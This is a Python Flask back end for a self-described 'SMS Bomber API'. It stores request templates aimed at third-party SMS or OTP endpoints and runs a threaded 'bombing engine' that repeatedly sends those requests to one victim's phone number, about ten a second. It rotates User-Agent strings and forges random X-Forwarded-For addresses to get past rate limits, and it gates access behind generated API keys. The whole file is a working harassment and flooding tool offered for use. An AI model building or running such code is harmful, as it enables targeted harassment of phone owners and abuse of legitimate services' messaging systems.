from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
import json
import os
import time
import random
import string
import threading
import requests as req_lib
from datetime import datetime

app = Flask(__name__, static_folder='../admin', static_url_path='/admin')
CORS(app)

# ===== DATA FILES =====
REQUESTS_FILE = 'requests/requests.json'
KEYS_FILE = 'config/keys.json'
STATS_FILE = 'config/stats.json'

# ===== LOAD DATA =====
def load_requests():
    try:
        with open(REQUESTS_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_requests(data):
    os.makedirs(os.path.dirname(REQUESTS_FILE), exist_ok=True)
    with open(REQUESTS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def load_keys():
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_keys(data):
    os.makedirs(os.path.dirname(KEYS_FILE), exist_ok=True)
    with open(KEYS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def load_stats():
    try:
        with open(STATS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}

def save_stats(data):
    os.makedirs(os.path.dirname(STATS_FILE), exist_ok=True)
    with open(STATS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ===== GLOBALS =====
requests_data = load_requests()
keys_data = load_keys()
stats_data = load_stats()
bombing_active = False
bombing_thread = None
bombing_lock = threading.Lock()

# ===== ROUTES =====

@app.route('/')
@app.route('/api/health')
def health():
    return jsonify({"status": "ok", "message": "SMS Bomber API is live!"})

@app.route('/api/requests', methods=['GET'])
def get_requests():
    return jsonify(requests_data)

@app.route('/api/requests', methods=['POST'])
def add_request():
    data = request.json
    new_req = {
        "name": data.get('name'),
        "url": data.get('url'),
        "method": data.get('method', 'POST'),
        "headers": data.get('headers', {}),
        "body": data.get('body', '{}'),
        "phones": data.get('phones', []),
        "active": True,
        "created": datetime.now().isoformat()
    }
    requests_data.append(new_req)
    save_requests(requests_data)
    return jsonify({"success": True, "request": new_req})

@app.route('/api/requests/<int:idx>/toggle', methods=['PUT'])
def toggle_request(idx):
    if 0 <= idx < len(requests_data):
        requests_data[idx]['active'] = not requests_data[idx]['active']
        save_requests(requests_data)
        return jsonify({"success": True})
    return jsonify({"success": False}), 404

@app.route('/api/requests/<int:idx>', methods=['DELETE'])
def delete_request(idx):
    if 0 <= idx < len(requests_data):
        requests_data.pop(idx)
        save_requests(requests_data)
        return jsonify({"success": True})
    return jsonify({"success": False}), 404

@app.route('/api/keys', methods=['POST'])
def generate_key():
    data = request.json
    expiry = data.get('expiry', 3600)
    key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    keys_data[key] = {
        "created": datetime.now().isoformat(),
        "expiry": expiry,
        "expires_at": time.time() + expiry if expiry > 0 else None
    }
    save_keys(keys_data)
    return jsonify({"success": True, "key": key})

@app.route('/api/keys/<key>', methods=['DELETE'])
def revoke_key(key):
    if key in keys_data:
        del keys_data[key]
        save_keys(keys_data)
        return jsonify({"success": True})
    return jsonify({"success": False}), 404

@app.route('/api/stats', methods=['GET'])
def get_stats():
    global stats_data
    # Count active requests
    active_count = sum(1 for r in requests_data if r.get('active', True))
    return jsonify({
        "total_requests": len(requests_data),
        "active_requests": active_count,
        "total_keys": len(keys_data),
        "usage": stats_data
    })

# ===== BOMBING ENGINE =====

def bombing_worker(phone, api_key):
    global bombing_active, stats_data
    active_requests = [r for r in requests_data if r.get('active', True)]
    
    if not active_requests:
        print("❌ No active requests")
        bombing_active = False
        return
    
    print(f"💀 Bombing started on {phone} with {len(active_requests)} requests")
    
    while bombing_active:
        for req in active_requests:
            if not bombing_active:
                break
            
            # Choose phone variation
            phone_variants = req.get('phones', [phone])
            target_phone = random.choice(phone_variants) if phone_variants else phone
            
            # Build request
            url = req['url'].replace('{phone}', target_phone)
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ])
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            try:
                if req['method'] == 'POST':
                    if isinstance(req['body'], dict):
                        r = req_lib.post(url, headers=headers, json=req['body'], timeout=5)
                    else:
                        body = req['body'].replace('{phone}', target_phone)
                        r = req_lib.post(url, headers=headers, data=body, timeout=5)
                else:
                    r = req_lib.get(url, headers=headers, timeout=5)
                
                # Update stats
                with bombing_lock:
                    stats_data['total_requests'] += 1
                    if r.status_code == 200:
                        stats_data['success'] += 1
                    elif r.status_code == 429:
                        stats_data['rate_limited'] += 1
                    else:
                        stats_data['failed'] += 1
                    save_stats(stats_data)
                
                print(f"[{req['name']}] {r.status_code} | {target_phone}")
                
            except Exception as e:
                with bombing_lock:
                    stats_data['total_requests'] += 1
                    stats_data['failed'] += 1
                    save_stats(stats_data)
                print(f"[{req['name']}] ERROR: {str(e)[:50]}")
            
            # Small delay to control speed
            time.sleep(0.1)  # 10 requests per second per thread

@app.route('/api/bomb/start', methods=['POST'])
def start_bombing():
    global bombing_active, bombing_thread, stats_data
    
    data = request.json
    api_key = data.get('api_key') or request.headers.get('X-API-Key')
    if not api_key or api_key not in keys_data:
        return jsonify({"error": "Invalid API key"}), 401
    
    phone = data.get('phone')
    if not phone:
        return jsonify({"error": "Phone number required"}), 400
    
    if bombing_active:
        return jsonify({"error": "Bombing already active"}), 400
    
    # Reset stats for this session
    stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
    save_stats(stats_data)
    
    bombing_active = True
    bombing_thread = threading.Thread(target=bombing_worker, args=(phone, api_key))
    bombing_thread.daemon = True
    bombing_thread.start()
    
    active_count = sum(1 for r in requests_data if r.get('active', True))
    return jsonify({
        "success": True,
        "message": f"Bombing started on {phone} with {active_count} active requests",
        "phone": phone,
        "active_requests": active_count
    })

@app.route('/api/bomb/stop', methods=['POST'])
def stop_bombing():
    global bombing_active
    api_key = request.headers.get('X-API-Key') or request.json.get('api_key')
    if not api_key or api_key not in keys_data:
        return jsonify({"error": "Invalid API key"}), 401
    
    if not bombing_active:
        return jsonify({"error": "No active bombing session"}), 400
    
    bombing_active = False
    return jsonify({
        "success": True,
        "message": "Bombing stopped",
        "stats": stats_data
    })

@app.route('/api/bomb/status', methods=['GET'])
def bombing_status():
    return jsonify({
        "active": bombing_active,
        "stats": stats_data,
        "active_requests": sum(1 for r in requests_data if r.get('active', True))
    })

@app.route('/api/send', methods=['POST'])
def send_single():
    data = request.json
    api_key = data.get('api_key') or request.headers.get('X-API-Key')
    if not api_key or api_key not in keys_data:
        return jsonify({"error": "Invalid API key"}), 401
    
    phone = data.get('phone')
    if not phone:
        return jsonify({"error": "Phone required"}), 400
    
    req_name = data.get('requestName')
    req = None
    for r in requests_data:
        if r.get('active', True):
            if req_name and r['name'] == req_name:
                req = r
                break
            elif not req_name:
                req = r
                break
    
    if not req:
        return jsonify({"error": "No active request"}), 404
    
    # Send single request
    phone_variants = req.get('phones', [phone])
    target_phone = random.choice(phone_variants) if phone_variants else phone
    
    url = req['url'].replace('{phone}', target_phone)
    headers = req['headers'].copy()
    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    
    try:
        if req['method'] == 'POST':
            if isinstance(req['body'], dict):
                r = req_lib.post(url, headers=headers, json=req['body'], timeout=5)
            else:
                body = req['body'].replace('{phone}', target_phone)
                r = req_lib.post(url, headers=headers, data=body, timeout=5)
        else:
            r = req_lib.get(url, headers=headers, timeout=5)
        
        with bombing_lock:
            stats_data['total_requests'] += 1
            if r.status_code == 200:
                stats_data['success'] += 1
            else:
                stats_data['failed'] += 1
            save_stats(stats_data)
        
        return jsonify({
            "status": r.status_code,
            "message": r.text[:100],
            "phone": target_phone,
            "request": req['name']
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/admin')
@app.route('/admin/')
def serve_admin():
    return send_from_directory('../admin', 'index.html')

# Vercel handler
def handler(request, *args, **kwargs):
    return app(request, *args, **kwargs)

if __name__ == '__main__':
    app.run(debug=True, port=5000)
